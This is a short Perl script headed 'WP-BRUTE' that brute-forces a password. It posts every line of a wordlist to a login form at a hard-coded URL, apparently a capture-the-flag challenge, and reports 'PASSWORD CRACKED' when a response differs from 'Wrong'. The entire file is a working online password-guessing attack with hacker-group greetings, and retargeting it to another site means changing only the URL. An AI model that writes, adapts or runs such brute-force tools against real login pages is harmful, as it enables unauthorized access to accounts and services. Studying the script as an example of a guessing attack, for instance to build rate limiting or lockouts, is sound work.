#!/usr/bin/perl

# WP-BRUTE BY MMXM
# Gr33tz To Cy¢lone & Ut0p|4

use LWP::UserAgent;
use Data::Dumper qw(Dumper);

my $site ='http://game.rop.sh/chall/5/';
$wordl = $ARGV[0];

my $a;

open($a,"<$wordl") or die "$!";

my $word;

print "\n\n\n$_:\n\nAttacking...\n\n";
sleep(5);
while(my $data=<$a>){
chomp($data);


 my @words = split / /, $data, 20;

    
my $ua = new LWP::UserAgent;

my $response = $ua->post($site, {password =>@words,submit =>'Enter'});

my $code = $response->content;
	
my $r=$response->content;
my $w;
	$w=$response->code;
if($code=~/^Wrong/&&$w==200){
   $code=0;
   print "[+] Testing==> ";
   print @words;
   print "\t::$r\n"
   
}
else{
if($code!=0){

print "\n\n\t[*] PASSWORD CRACKED:$r====";
print @words;
exit;
}
}
}

exit;